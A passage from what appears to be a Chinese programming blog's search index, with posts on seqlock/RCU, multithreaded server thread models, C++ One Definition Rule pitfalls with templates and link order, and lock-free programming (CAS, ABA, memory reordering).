write</span><br></pre></td></tr></table></figure>\n\n<p>甚至是进入和离开都写，一样会存在上图的问题，读线程会感知不到写线程的存在。</p>\n<p>但是进入和离开都写有一个重要的特性是，当当前没有写线程的时候，seqcount总是偶数，所以读线程这里要做的是只有在seqcount是偶数的时候才开始读，然后读完的时候只要seqcount变化了就重新等待seqcount是偶数再读。这就可以解决感知不到写线程的问题了。</p>\n<p>可以看出来这个逻辑对读线程是比较不公平的，可能需要频繁重试，不过这本来也就是这个锁的特点，他适合于write操作较少，但是又对write性能要求高的场景。</p>\n<p>此外这个锁还有个致命的缺点，就是由于在写线程存在的时候，读线程还是会进入临界区，因此如果此时写线程释放了某个指针，那么读线程可能就会触发空指针的异常。因此该锁只能用来锁定简单的数据类型。</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://www.ibm.com/developerworks/cn/linux/l-cn-lockfree/index.html\">透过 Linux 内核看无锁编程</a></p>\n<p><a href=\"http://www.hyuuhit.com/2018/11/08/rcu/\">Linux RCU 内核同步机制</a></p>\n<p><a href=\"http://www.embeddedlinux.org.cn/html/yingjianqudong/201404/07-2830.html\">再谈Linux内核中的RCU机制</a></p>\n","categories":["代码"],"tags":["系统"]},{"title":"线程扩展需要考虑的问题","url":"/2017/02/08/multithread/","content":"<h2 id=\"线程扩展要考虑的问题\"><a href=\"#线程扩展要考虑的问题\" class=\"headerlink\" title=\"线程扩展要考虑的问题\"></a>线程扩展要考虑的问题</h2><h3 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h3><p>如今越来越多的后台系统采用了单线程的设计，原因多是因为单线程的设计简单轻量，而且更安全（无多线程竞争）。<br>而其性能保证则通过多进程的方式来完成，多进程由于互相隔离，也是稳定性的保证。<br>比如nginx默认工作方式就是单线程多进程；其他的案例比如node.js的集群;比如redis的集群。<br>通常这种方式能很好的工作，然而有些时候你还是会面临项目向多线程转变的时候，比如项目的技术栈从node.js转向Go，Go又是天生为并发而生的；<br>比如项目在演进过程中出现了CPU密集型的业务，单线程会严重影响性能；比如多进程架构扩展时遇到了IP等资源不足（比如业务需要为每个进程绑定一个公网IP）的限制。<br>那么当你在处理这种架构转变的时候，需要考虑哪些问题呢？</p>\n<span id=\"more\"></span>\n\n<h3 id=\"线程模型\"><a href=\"#线程模型\" class=\"headerlink\" title=\"线程模型\"></a>线程模型</h3><p>对于多线程的架构，采用什么线程模型是首要解决的问题。</p>\n<h4 id=\"netty的模型\"><a href=\"#netty的模型\" class=\"headerlink\" title=\"netty的模型\"></a>netty的模型</h4><p>我们直接拿大名鼎鼎的netty的模型来看：<br><img src=\"/linkimage/multithread/1.jpg\" alt=\"netty thread model\"></p>\n<p>可以看到，首先由单独的线程来做accept操作，这点没有什么疑问，为了响应迅速，单独拿线程来做accept是没有什么问题的。<br>另一个是工作线程组，也就是一个线程池，这个线程组会接收accept线程accept之后的socketchannel，也就是socket的fd，来负责这个fd的IO操作。<br>netty的这个线程组很特殊，这个线程组不光要负责IO操作，还要负责跑具体的业务，也就是说read-&gt;handle-&gt;write都在一个线程上完成。<br>所以这里有个问题是IO类操作(read/write)和业务操作(handle)会互相等待，由于IO相对业务较快，比较容易发生的是IO会被业务给阻塞。<br>netty解决这个问题的方法是，首先程序员要自己清楚这个线程不能跑轻量的任务，否则会阻塞IO以及其他socketchannel的业务。<br>其次，对于CPU密集型的非轻量的操作，要自己拆分，然后把拆分后的任务扔到这同一个线程组中执行。<br>为什么我说netty是这么建议的呢，因为首先netty并无其他线程池存在，并且这个线程组存在接口来注册非IO的任务。</p>\n<h4 id=\"IO分离\"><a href=\"#IO分离\" class=\"headerlink\" title=\"IO分离\"></a>IO分离</h4><p>但是如果你不是用的netty，你也不是非要像netty这么设计。<br>为了防止IO和业务互相阻塞，我们可以设计成两个线程组：<br><img src=\"/linkimage/multithread/2.jpg\" alt=\"two pool thread model\"></p>\n<p>可以看到，由一个线程来accept，accept之后，socket被放到network线程组。<br>network线程组的每个线程包含一个epoll/selector, network线程组触发的事件会被抛到work线程组，work线程组的IO写操作也会被抛回network线程组。<br>这样IO和业务是跑在不同的线程中的，不会发生互相阻塞的事情。</p>\n<p>上面这两个线程模型基本可以涵盖大部分的服务器后端的线程架构。</p>\n<h3 id=\"线程安全\"><a href=\"#线程安全\" class=\"headerlink\" title=\"线程安全\"></a>线程安全</h3><p>多线程的架构避免不了要面对这个问题，我们也要面对，而且是优先要考虑这个问题，因为线程安全严重的会导致程序崩溃，轻的也会影响业务的准确性，最少他也能影响系统的性能。<br>我们处理线程安全的策略有3个。</p>\n<h4 id=\"暴力面对\"><a href=\"#暴力面对\" class=\"headerlink\" title=\"暴力面对\"></a>暴力面对</h4><p>正所谓真的勇士，敢于直面惨淡的人生，敢于正视淋漓的献血。<br>这种策略是为每一个非线程安全的地方加上锁保护，每一个STL容器的遍历，每一个数据库的访问，每一个计数器的增减，我们都加上锁，管你是多少个线程我都不怕，管你把这个任务扔到了哪个线程上运行也都没事。<br>这种方法其实挺好的，只不过我没有办法保证你这么做的时候不会出问题，比如死锁，或者锁加的不好，导致等待时间长，影响性能。<br>只要你合理的加锁，这种方式是可以的。</p>\n<h4 id=\"按功能拆分\"><a href=\"#按功能拆分\" class=\"headerlink\" title=\"按功能拆分\"></a>按功能拆分</h4><p>虽然线程池中有很多线程，但是我们可以给同一类功能的操作放到同一个线程中，比如专门取一个线程作为数据库线程，所以数据库访问的任务都会被定向到这个线程中，因此就是串行操作不会有线程安全的问题。<br>这个方案的思路就是把线程池中的线程拆分成几个部分，所有可能引起线程安全问题的都单独建立一个线程，把并行的场景转化成串行的场景。<br>如图：<br><img src=\"/linkimage/multithread/3.jpg\" alt=\"split by function thread model\"></p>\n<h4 id=\"按业务拆分\"><a href=\"#按业务拆分\" class=\"headerlink\" title=\"按业务拆分\"></a>按业务拆分</h4><p>有的服务器会把一些状态类信息放到数据库中（redis/Cassandra）保存，做到无状态。也有的会把一些状态信息放到内存中，这可能是出于效率的考虑，或者是出于系统整体的架构不引入第三方服务。<br>对于把会话等状态信息放在内存中的系统，我们可以按照足以避免竞争的业务单元来拆分系统，把一个业务单元的业务都跑到同一个线程上去。<br>比如确保同一个会话的所有业务运行到单个线程，而这个线程可以承担多个业务单元的运行。如图：<br><img src=\"/linkimage/multithread/4.jpg\" alt=\"split by business thread model\"></p>\n<h3 id=\"负载均衡\"><a href=\"#负载均衡\" class=\"headerlink\" title=\"负载均衡\"></a>负载均衡</h3><p>要很好地发挥出多个CPU的性能, 必须保证分配到各个CPU 上的任务有一个很好的负载平衡。否则一些CPU 在运行, 而另一些CPU 却处于空闲, 而实际的效率是以任务较重的CPU 为准, 从而造成性能的瓶颈, 无法发挥出多核CPU 的优势。<br>要实现一个好的负载平衡通常有两种方案,一种是静态负载平衡, 采用人工干预的方法预先将任务分割成多个可并行执行的部分, 尽量保证分割的各个部分可以均衡地运行在不同的核上;<br>另外一种是动态负载平衡, 在程序的运行过程中进行任务的分配达到负载平衡的目的。</p>\n<h4 id=\"动态拆分和静态拆分\"><a href=\"#动态拆分和静态拆分\" class=\"headerlink\" title=\"动态拆分和静态拆分\"></a>动态拆分和静态拆分</h4><p>负载均衡的方法还与线程安全的策略有很大关系，比如线程安全采用的是暴力面对，那么负载均衡很简单了，用动态分配的方式，把请求轮询得抛给线程池的线程就可以了。<br>如果采用的是按照功能拆分，那么就是采用的静态的分配方法，分配后如果发现某个线程特别的重，那么需要合理地拆分这个线程的任务，比如如果访问数据库的线程太重，那么可以把访问A业务和访问B业务的请求拆分到不同的线程，这样既不影响线程安全又可以负载均衡。<br>同样的如果某个线程空闲则可以进行线程的合并。</p>\n<p>如果采用的是按照业务来分，比如按照会话来拆分，由于会话之间的体量并不相同，因此不光不能静态分配，就连动态分配也有难度，比如轮询得分配，能确保分配的数量一致，但是每个会话的体量不同，实际的负荷也是不同的。<br>对于这种情况，需要采用动态计算的方式，比如最小CPU的方法：<br>每个线程定时计算自己的CPU，然后在会话初次创建时，选择一个最小CPU的线程来创建，随后该会话的业务都跑到该线程上去。并且保持CPU的定时更新。<br>或者采用最小连接数：<br>每个线程统计处于自身线程上的socket连接个数，然后在会话初次创建时，选择一个最少socket的线程来创建，随后该会话的业务都跑到该线程上去。</p>\n<h4 id=\"大任务的拆分\"><a href=\"#大任务的拆分\" class=\"headerlink\" title=\"大任务的拆分\"></a>大任务的拆分</h4><p>这里还是再次强调一次netty中的场景，我们前面说到过，netty中</p>\n<ol>\n<li>不能跑繁重的任务，因为netty的线程业务和网络IO跑一起的，业务太繁忙，会引起IO网络响应缓慢，影响网络的吞吐。</li>\n<li>如果你必须要跑繁重的任务，那么要学会拆分，把大任务拆分成小任务，并扔回线程池中运行。netty的线程池是接受非IO任务的。</li>\n</ol>\n<p>拆分的图示：<br><img src=\"/linkimage/multithread/5.jpg\" alt=\"split light task thread model\"></p>\n","categories":["架构"],"tags":["线程"]},{"title":"ODR-The One Definition Rule","url":"/2016/11/14/odr/","content":"<h2 id=\"ODR-One-Definition-Rule-下的奇淫异技\"><a href=\"#ODR-One-Definition-Rule-下的奇淫异技\" class=\"headerlink\" title=\"ODR-(One Definition Rule) 下的奇淫异技\"></a>ODR-(One Definition Rule) 下的奇淫异技</h2><h3 id=\"一行输出引起的-故事\"><a href=\"#一行输出引起的-故事\" class=\"headerlink\" title=\"一行输出引起的..故事\"></a>一行输出引起的..故事</h3><p>首先看这个终端的输出结果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost xxxx]# g++ -o binary binary.cpp libb.a liba.a</span><br><span class=\"line\">[root@localhost xxxx]# ./binary </span><br><span class=\"line\">1</span><br><span class=\"line\">1</span><br><span class=\"line\">[root@localhost xxxx]# g++ -o binary binary.cpp liba.a libb.a</span><br><span class=\"line\">[root@localhost xxxx]# ./binary </span><br><span class=\"line\">2</span><br><span class=\"line\">2</span><br><span class=\"line\">[root@localhost xxxx]# cat binary.cpp</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">extern int fna();</span><br><span class=\"line\">extern int fnb();</span><br><span class=\"line\"></span><br><span class=\"line\">int main()&#123;</span><br><span class=\"line\">    std::cout &lt;&lt; fna() &lt;&lt; std::endl;</span><br><span class=\"line\">    std::cout &lt;&lt; fnb() &lt;&lt; std::endl;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>可以看到我们通过改变两个库的链接顺序，改变了两个函数的返回值。how?<br>如果你对这个结果并没什么兴趣，你也许对下面的内容也不感兴趣。但是如果你挺有兴趣的话我们就来一起看看。</p>\n<span id=\"more\"></span>\n\n<h3 id=\"小王的猜想\"><a href=\"#小王的猜想\" class=\"headerlink\" title=\"小王的猜想\"></a>小王的猜想</h3><p>小王同学首先是这么想的，liba 和libb中可能都含有fna和fnb两个函数，链接顺序不同就会调用不同的实现。<br>但是又一想，不对啊，这么弄不是会报重定义的错误吗？会吗？不会吗？<br>我们来验证一把，看看同名函数（我使用一个叫common的函数来举例）能不能同时存在并链接成功：<br>文件结构：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">               | --&gt;   liba.cpp   |</span><br><span class=\"line\">common.hpp  -&gt; | --&gt;   libb.cpp   | =&gt; binary  </span><br><span class=\"line\">                     binary.cpp   |</span><br></pre></td></tr></table></figure>\n<p>代码：<br><img src=\"/linkimage/odr/1.png\" alt=\"code with common\"></p>\n<p>结果很遗憾，确实是重定义：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost xxxx]# g++ -c liba.cpp &amp;&amp; ar rcs liba.a liba.o</span><br><span class=\"line\">[root@localhost xxxx]# g++ -c libb.cpp &amp;&amp; ar rcs libb.a libb.o</span><br><span class=\"line\">[root@localhost xxxx]# g++ -o binary binary.cpp libb.a liba.a</span><br><span class=\"line\">liba.a(liba.o): In function `common()&#x27;:</span><br><span class=\"line\">liba.cpp:(.text+0x0): multiple definition of `common()&#x27;</span><br><span class=\"line\">libb.a(libb.o):libb.cpp:(.text+0x0): first defined here</span><br><span class=\"line\">collect2: ld returned 1 exit status</span><br><span class=\"line\">[root@localhost xxxx]# </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"小红的不服\"><a href=\"#小红的不服\" class=\"headerlink\" title=\"小红的不服\"></a>小红的不服</h3><p>小红看了后有一丝不确定，“我觉得他报重定义是因为common函数在两边的实现完全一致，如果不一样，可能，就不会重定义了”。<br>我们就是要这么严谨，来试一试，我们用宏来控制两边的实现：<br><img src=\"/linkimage/odr/2.png\" alt=\"code with common and macro\"></p>\n<p>结果依然很遗憾，还是重定义：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost xxxx]# g++ -c libb.cpp &amp;&amp; ar rcs libb.a libb.o</span><br><span class=\"line\">[root@localhost xxxx]# g++ -c liba.cpp &amp;&amp; ar rcs liba.a liba.o</span><br><span class=\"line\">[root@localhost xxxx]# g++ -o binary binary.cpp libb.a liba.a</span><br><span class=\"line\">liba.a(liba.o): In function `common()&#x27;:</span><br><span class=\"line\">liba.cpp:(.text+0x0): multiple definition of `common()&#x27;</span><br><span class=\"line\">libb.a(libb.o):libb.cpp:(.text+0x0): first defined here</span><br><span class=\"line\">collect2: ld returned 1 exit status</span><br></pre></td></tr></table></figure>\n\n<p>可见编译器只看函数的定义不在意实现，只要定义一致就当做重定义。</p>\n<h3 id=\"学霸的愤怒\"><a href=\"#学霸的愤怒\" class=\"headerlink\" title=\"学霸的愤怒\"></a>学霸的愤怒</h3><p>只考99分就必须大哭的学霸小丁看不下去了，“你们都不知道有模板这个bug吗？”<br>没错，模板在重定义这件事情上确实是bug般的存在，你可以想一下模板，比如vector。<br>vector的所有定义（包括实现）都是通过头文件包含进来的，对于cpp，你编译几个就有几个实现，链接成.a后,你有几个.a你就有几个实现。<br>最后还照样能链接成功。<br>我们来试试，把common改成模板：<br><img src=\"/linkimage/odr/3.png\" alt=\"code with common template\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost xxxx]# g++ -c libb.cpp &amp;&amp; ar rcs libb.a libb.o</span><br><span class=\"line\">[root@localhost xxxx]# g++ -c liba.cpp &amp;&amp; ar rcs liba.a liba.o</span><br><span class=\"line\">[root@localhost xxxx]# g++ -o binary binary.cpp libb.a liba.a</span><br><span class=\"line\">[root@localhost xxxx]# </span><br></pre></td></tr></table></figure>\n<p>这次总算是成功了。不过这时候不管怎么换链接顺序，结果必然都是1.</p>\n<h3 id=\"柳暗花明\"><a href=\"#柳暗花明\" class=\"headerlink\" title=\"柳暗花明\"></a>柳暗花明</h3><p>于是我们又想起来不服气的小红，那时我们尝试不同cpp不同的实现失败了。<br>现在既然在学霸的指点下不再报重定义，那么我们继续用宏来控制他的实现看看，肯定也不会报重定义吧？<br>或者会不会报一个类似“实现不一致”的错误？毕竟我们从来没有故意把模板做成多个实现过。<br>没有试过我们不敢乱说：<br><img src=\"/linkimage/odr/4.png\" alt=\"code with common template and macro\"><br>很顺利</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost xxxx]# g++ -c liba.cpp &amp;&amp; ar rcs liba.a liba.o</span><br><span class=\"line\">[root@localhost xxxx]# g++ -c libb.cpp &amp;&amp; ar rcs libb.a libb.o</span><br><span class=\"line\">[root@localhost xxxx]# g++ -o binary binary.cpp libb.a liba.a</span><br><span class=\"line\">[root@localhost xxxx]#</span><br></pre></td></tr></table></figure>\n<p>我们继续尝试调换链接顺序</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost xxxx]# g++ -o binary binary.cpp libb.a liba.a</span><br><span class=\"line\">[root@localhost xxxx]# ./binary </span><br><span class=\"line\">1</span><br><span class=\"line\">1</span><br><span class=\"line\">[root@localhost xxxx]# g++ -o binary binary.cpp liba.a libb.a</span><br><span class=\"line\">[root@localhost xxxx]# ./binary </span><br><span class=\"line\">2</span><br><span class=\"line\">2</span><br><span class=\"line\">[root@localhost xxxx]# </span><br></pre></td></tr></table></figure>\n<p>太棒了！做到了。</p>\n<h3 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h3><p>造成这种现象的原因是同一个函数在不同的库中有多份实现，链接顺序不同的话，最终编译器会选择其中的一个。<br>这种情况普通函数不会出现，然而对于模板，编译器给了它特权，允许有多份实现。<br>假如这多个实现不相同，然而他们的定义是一致的，编译器就单纯的认为这是同一个函数，我任选一个就行了（实际上由于该现象未定义，编译器可以自己决定要哪个）。</p>\n<p>C++为了避免这种情况，有一个规则：<br>ODR（One Definition Rule）：types, templates, extern inline functions,可以定义在不同的 translation unit（比如一个lib）中. 但是对于一个给定的实体 每一个定义必须相同.</p>\n<p>看到了吧，它说模板可以多个库都有定义（也就有多份实现），但是这每一份必须相同。咦怎么没有提到实现必须一致，模板这种多个定义不就多个实现吗？没有提到！<br>所以ODR是说模板可以定义在不同的单元中，由此带来的多份实现我不给你报错，让你能够编译通过。但是实现是否相同我不说，所以很遗憾对于实现,我们只能人工得去遵守，编译器说它爱莫能助。它只在乎你的类型。</p>\n<p>我们在平时编码时要注意头文件中少用宏来区分实现，可以避免一部分ODR相关的坑。cpp中用宏不当其实也可能，比如DEBUG选项，压栈顺序之类的宏开关。</p>\n","categories":["代码"],"tags":["西佳佳"]},{"title":"Lock-Free","url":"/2017/09/19/reorder/","content":"<h1 id=\"Lock-Free\"><a href=\"#Lock-Free\" class=\"headerlink\" title=\"Lock-Free\"></a>Lock-Free</h1><h2 id=\"什么是Lock-Free\"><a href=\"#什么是Lock-Free\" class=\"headerlink\" title=\"什么是Lock-Free\"></a>什么是Lock-Free</h2><p>Lock-Free也叫LockLess也就是无锁编程，它是一种在多线程之间安全的共享数据的一种方式，并且不需要有获取和释放锁的开销。但是不使用锁来进行编程却只是无锁编程的一部分。我们先用一个图来看看如何判断是不是无锁编程：<br><img src=\"/linkimage/reorder/its-lock-free.png\" alt=\"如何确认是lockfree\"><br>从这个图上可以看出，无锁编程中的锁并不是直接指向lock或者说mutex，而是指一种把整个程序锁住的可能性，无论是死锁还是活锁，甚至是因为你做了你能想到的最差的线程调度决策。如此一来，即使是共享锁也被排除在外。因为当你用<code>std::shared_lock&lt;std::shared_mutex&gt; lock(mutex_);</code> 拿到锁之后，你可以简单地再也不调度这个线程，来导致 <code>std::unique_lock&lt;std::shared_mutex&gt; lock(mutex_);</code>永远得不到锁。</p>\n<p>下面这个例子中我们不使用mutex和lock，但是它依然不是Lock-Free，因为你可以调度执行这个函数的两个线程使得它俩都不退出循环。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">while (X == 0)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    X = 1 - X;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>我们并不会期望整个大程序都是Lock-Free，通常我们会指明其中某些操作是Lock-Free的，比如一个队列的实现中，我们会存在少数的Lock-Free操作，比如<code>push</code>,<code>pop </code>等等。</p>\n<p>Lock-Free的一个重要的结论是，当你暂停一个线程的运行，它并不会阻止其他线程继续执行，其他线程就像一个整体，继续他们的Lock-Free操作。这也是Lock-Free编程的价值，特别是当你编写中断处理程序、实时系统时，他们必须在规定的时间内完成任务，无论程序的其他部分怎么执行。</p>\n<span id=\"more\"></span>\n\n<p>注意，假如我们是故意把部分操作设计成阻塞形式的，那么这并不会让程序中的算法不再Lock-Free。比如我们故意把pop设计成空的时候阻塞等待，那么我们依然可以声称程序的其他部分依然是Lock-Free的（比如pop中非空时候的算法逻辑）。</p>\n<p>Lock-Free虽然是一种很有效的多线程编程技术，但是它不应该被轻易的使用。使用它之前你必须理解它的复杂性，并且仔细的确认它真的能给你带来你期望的收益。在很多情况下，通常存在更简单和快捷的解决方案，比如减少数据共享的频率。同时正确和安全的使用无锁编程需要对你使用的硬件（处理器）和编译器有较多的知识。</p>\n<h2 id=\"Lock-Free的技术要点\"><a href=\"#Lock-Free的技术要点\" class=\"headerlink\" title=\"Lock-Free的技术要点\"></a>Lock-Free的技术要点</h2><p>事实证明，当你试图编写满足Lock-Free条件的程序时，一系列的技术向你袭来： 原子操作，内存屏障， ABA问题等。这让整个事情变得不那么好玩了。<br>下面我会分别介绍这些技术点，并在最后用一幅图来表示这些技术之间的关系。</p>\n<h3 id=\"原子性R-M-W操作\"><a href=\"#原子性R-M-W操作\" class=\"headerlink\" title=\"原子性R-M-W操作\"></a>原子性R-M-W操作</h3><p>原子操作指的是一系列不可分割的操作，其他线程无法看到这一系列操作的中间状态。现代处理器上，一些操作已经保证是原子性的，比如读写简单变量，比如赋值一个int类型的变量，是原子性的。然而对简单变量的原子性操作其实是有条件的，一个是内存对齐，一个是字节大小要小于等于总线宽度。我简单解释一下，数据总线在读写数据时总是根据总线宽度一次获取一定大小的数据，我们的简单变量的大小只要是小于等于总线宽度的，总线只需要操作一次。但是总线读取数据时总是内存对齐的，比如总线宽度为8则总是以8的倍数来读取，0<del>7，8</del>15，16~23，所以如果我们的简单变量的内存地址没有和8对齐，那么操作4字节的变量就可能需要两次才能完成，8字节的变量一定需要两步才能完成。因此中间可能会被打断，造成不是原子性的。对于内存对齐，我们平常的使用中以下代码都是可以自动保证对齐的，不需要担心：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">// 以64位机器为例，总线宽度即是8字节</span><br><span class=\"line\">int x;  // 4字节，地址自动与4对齐，即可</span><br><span class=\"line\">long y;  // 8字节，地址与8对齐</span><br><span class=\"line\">long *z=(long*)malloc(sizeof(long)); // malloc,地址与16对齐</span><br><span class=\"line\">// malloc的对齐值通常是sizeof(long double)，最大简单变量的大小</span><br></pre></td></tr></table></figure>\n<p>因此对于32bit机器的<code>long long</code>和<code>double</code>，以及23bit和64bit的<code>long double</code>类型，我们不能确保原子性。但是你可能要说了，我们平时32位机器从来没为double和long long加过锁啊。是的，那是因为intel x86的处理器为我们增加了8字节的保证，确保32bit系统依然可以保证64位内存读取的原子性。其他处理器是没有这个保证的。<br><a href=\"http://www.cs.cmu.edu/~410-f10/doc/Intel_Reordering_318147.pdf\">参考intel reorder的文档.</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">Intel 64 memory ordering guarantees that for each of the following memory-access</span><br><span class=\"line\">instructions, the constituent memory operation appears to execute as a single memory access</span><br><span class=\"line\">regardless of memory type:</span><br><span class=\"line\">  1. Instructions that read or write a single byte.</span><br><span class=\"line\">  2. Instructions that read or write a word (2 bytes) whose address is aligned on a 2 byte</span><br><span class=\"line\">boundary.</span><br><span class=\"line\">  3. Instructions that read or write a doubleword (4 bytes) whose address is aligned on a 4</span><br><span class=\"line\">byte boundary.</span><br><span class=\"line\">  4. Instructions that read or write a quadword (8 bytes) whose address is aligned on an 8</span><br><span class=\"line\">byte boundary. </span><br></pre></td></tr></table></figure>\n<p>因此对于单步读写、且在x86/x64上，除了long double类型，其他都是原子性的操作。<br>而对于多步的RMW(读改写)的原子操作，如果我们采用Lock-Free的话该怎么做呢？<br>不同的CPU采用不同的方式来支持原子操作，有的采用<a href=\"https://en.wikipedia.org/wiki/Load-link/store-conditional\">LL+SC</a>,有的采用<a href=\"https://en.wikipedia.org/wiki/Compare-and-swap\">CAS</a>，两者效果是等价的。<br>原子RMW操作是Lock-Free中不可或缺的一部分，没有原子操作，即使程序只在单个处理器上运行，依然会有问题，因为RMW运行中途可能会发生线程切换，导致中间状态被其他线程看到，产生与并发时同样的问题</p>\n<h4 id=\"CAS循环\"><a href=\"#CAS循环\" class=\"headerlink\" title=\"CAS循环\"></a>CAS循环</h4><p>最常被讨论的RMW问题应该是CAS（compare-and-swap）了。<br>编程者通常重复循环执行CAS来达成某个操作。这个过程典型的步骤是，先拷贝一个共享的变量到一个本地的变量，再根据需要执行一些特殊的操作，然后尝试写一个共享变量。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">// </span><br><span class=\"line\"></span><br><span class=\"line\">void LockFreeQueue::push_front(Node* newHead) &#123;</span><br><span class=\"line\">   // copy a shared variable to a local</span><br><span class=\"line\">   Node* oldHead = m_head;</span><br><span class=\"line\">   </span><br><span class=\"line\">   // some work by need</span><br><span class=\"line\">   newHead-&gt;next = oldHead;</span><br><span class=\"line\">   </span><br><span class=\"line\">   // write variable to a shared variable</span><br><span class=\"line\">   while (!m_head.compare_exchange_weak(newHead-&gt;next, newHead));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这样的循环依旧是Lock-Free的，因为当compare_exchange_weak返回false时意味着另一个线程操作成功了。<br>关于compare_exchange_weak返回false的原因，除了campare失败（此时意味着另一个线程成功了）其实还可能是其他原因，这是因为cas在有些平台上是有多条指令来实现的（x86是只有一条指令的），线程切换、地址被其他线程使用都会导致指令失败。不过好在这也只是导致多执行几次while循环。<br>参考这个问题 <a href=\"https://stackoverflow.com/questions/25199838/understanding-stdatomiccompare-exchange-weak-in-c11\">Understanding std::atomic::compare_exchange_weak() in C++11\n</a><br>我们也可以换成compare_exchange_strong,不过放在while循环中，用weak就足矣，会比strong版本效率高些。<br>在使用CAS循环时，要特别注意ABA问题。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">void pop_front()&#123;</span><br><span class=\"line\">    Node* p = m_head.load();</span><br><span class=\"line\">    while (p &amp;&amp; !m_head.compare_exchange_weak(p, p-&gt;next));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>假设目前链表中包含A-&gt;B-&gt;C这3个元素，当我这个线程运行至while中p-&gt;next取到B之后，另一个线程完成了弹出A、弹出B、释放B、插入A、这4个操作，行云流水一气呵成，这时候你开始执行你的CAS操作，m_head的值不变，于是你把m_head跟新成了B。显然出问题了，B已经被另一个线程释放了。这就是ABA问题。</p>\n<h3 id=\"顺序一致性\"><a href=\"#顺序一致性\" class=\"headerlink\" title=\"顺序一致性\"></a>顺序一致性</h3><p>顺序一致性是指所有线程都遵从一定的指令执行顺序，这个顺序与源代码顺序一致。反之，顺序不一致则表示指令执行顺序与源代码不一致。<br>我们通过一个例子来验证顺序一致性问题的存在。<br>假设我们有以下4个整数：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">int x=0;</span><br><span class=\"line\">int y=0;</span><br><span class=\"line\">int r1=0;</span><br><span class=\"line\">int r2=0;</span><br></pre></td></tr></table></figure>\n<p>另外有两个线程：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">void thread1()&#123;</span><br><span class=\"line\">  x = 1;    </span><br><span class=\"line\">  r1 = y;   </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void thread2()&#123;</span><br><span class=\"line\">  y = 1;   </span><br><span class=\"line\">  r2 = x;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这两个线程并发执行，那么最后r1和r2可能的取值是什么？<br>可以想到的是(1,0),(0,1),(1,1)这几个结果。那么有没有可能出现(0,0)呢？<br>什么情况下才会出现(0,0)的结果,下面是其中一种执行顺序。</p>\n<p><img src=\"/linkimage/reorder/cpureorder.png\" alt=\"cpu reorder\"></p>\n<p>也就是说thread1和thread2中的代码顺序必须发生颠倒，才能出现(0,0)的结果。<br>然后我在主线程中增加一个循环来执行thread1和thread2，然后检查r1和r2的值。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">int count = 0;</span><br><span class=\"line\">int reorder = 0;</span><br><span class=\"line\">while(1)&#123;</span><br><span class=\"line\">    x=0;y=0;r1=0;r2=0;</span><br><span class=\"line\">    sem1.signal(); // notify thread1 run</span><br><span class=\"line\">    sem2.signal(); // notify thread2 run</span><br><span class=\"line\">                   // thread1 and thread2 running</span><br><span class=\"line\">    sem.wait();    // wait thread1 and thread2 complete </span><br><span class=\"line\">    sem.wait();    //</span><br><span class=\"line\">    if(r1==0 &amp;&amp; r2==0)&#123;  // check result</span><br><span class=\"line\">        reorder ++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    count ++;</span><br><span class=\"line\">    cout &lt;&lt; &quot;reorder count(&quot; &lt;&lt; reorder &lt;&lt; &quot;), total count(&quot; &lt;&lt; count &lt;&lt; &quot;)&quot; &lt;&lt; endl;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>点此查看<a href=\"/linkimage/reorder/reorder.cpp\">完整代码</a><br>我得到了这样的结果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">reorder count(705), total count(139507)</span><br><span class=\"line\">reorder count(705), total count(139508)</span><br><span class=\"line\">reorder count(706), total count(139509)</span><br><span class=\"line\">reorder count(706), total count(139510)</span><br><span class=\"line\">reorder count(706), total count(139511)</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p>发生概率略大于1/200.可见情况发生了。而能够产生乱序的原因有两个，一个是编译器优化，一个是cpu乱序。我首先插入代码来阻止编译器优化，阻止编译器擅自调换代码的顺序。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">void thread1()&#123;</span><br><span class=\"line\">    x = 1;</span><br><span class=\"line\">    asm volatile(&quot;&quot; ::: &quot;memory&quot;);</span><br><span 